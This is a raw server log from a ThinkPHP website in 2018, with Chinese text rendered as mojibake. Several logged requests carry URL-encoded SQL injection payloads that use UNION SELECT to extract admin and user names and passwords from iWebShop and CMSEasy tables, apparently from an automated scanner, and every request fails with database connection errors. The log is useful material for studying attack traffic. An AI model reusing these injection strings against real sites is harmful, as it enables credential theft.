[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?controller=block&action=spec_value_list&id=1%20union%20select%201,%28Select%20concat%280x5b,admin_name,0x3a,PassWord,0x5d%29%29,3,4,5,6%20from%20iwebshop_admin [Х©░Х║▄Ф≈╤И≈╢О╪ 1.171695s][Е░·Е░░Г▌┤О╪ 0.85req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.28kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:32+08:00 ] 220.181.55.144 POST /admin.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/admin.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.085771s][Е░·Е░░Г▌┤О╪ 0.92req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.03kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:39+08:00 ] 220.181.55.144 GET /index.php?controller=site&action=getProduct&specJSON=%7B%20%22people%22:%221'%20and%201=2%20union%20select%20md5(1122),2,3,4,5,6,7,8,9%20and%20'1'='1%22%7D
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?controller=site&action=getProduct&specJSON=%7B%20%22people%22:%221'%20and%201=2%20union%20select%20md5(1122),2,3,4,5,6,7,8,9%20and%20'1'='1%22%7D [Х©░Х║▄Ф≈╤И≈╢О╪ 1.156073s][Е░·Е░░Г▌┤О╪ 0.86req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.37kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:42+08:00 ] 220.181.55.144 POST /index.php?m=announcement&s=admin/notice
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?m=announcement&s=admin/notice [Х©░Х║▄Ф≈╤И≈╢О╪ 1.585694s][Е░·Е░░Г▌┤О╪ 0.63req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,358.90kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 54]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:43:47+08:00 ] 220.181.55.144 GET /index.php?case=archive&act=search&keyword=webscan%25%2527%29%09union%09select%090%2C0%2C0%2Cconcat%28username%2Cpassword%29%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%09from%09cmseasy_user%09where%09groupid%3D2%09union%09SELECT%09*%09FROM%09%60cmseasy_archive%60%09WHERE%09%28title%09like%09%2527%25aaaaaaaa
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?case=archive&act=search&keyword=webscan%25%2527%29%09union%09select%090%2C0%2C0%2Cconcat%28username%2Cpassword%29%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%09from%09cmseasy_user%09where%09groupid%3D2%09union%09SELECT%09*%09FROM%09%60cmseasy_archive%60%09WHERE%09%28title%09like%09%2527%25aaaaaaaa [Х©░Х║▄Ф≈╤И≈╢О╪ 1.085770s][Е░·Е░░Г▌┤О╪ 0.92req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.70kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T10:02:32+08:00 ] 219.238.35.101 GET /
[ info ] www.lcxxszzglzx.cn/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.757520s][Е░·Е░░Г▌┤О╪ 0.57req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.13kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T14:27:46+08:00 ] 220.181.159.82 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 5.327511s][Е░·Е░░Г▌┤О╪ 0.19req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.73kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
